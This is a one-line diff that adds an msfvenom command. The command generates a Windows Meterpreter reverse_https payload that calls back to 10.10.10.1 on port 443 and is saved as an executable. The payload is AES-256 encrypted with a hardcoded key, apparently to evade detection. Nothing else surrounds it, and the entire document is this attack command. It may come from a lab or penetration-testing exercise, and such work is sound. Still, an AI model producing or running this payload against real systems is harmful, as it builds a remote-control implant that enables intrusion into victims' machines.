@@ -1,0 +1,1 @@
+msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.1 LPORT=443 -f exe -o enrypted.exe --encrypt aes256 --encrypt-key davielpatem123
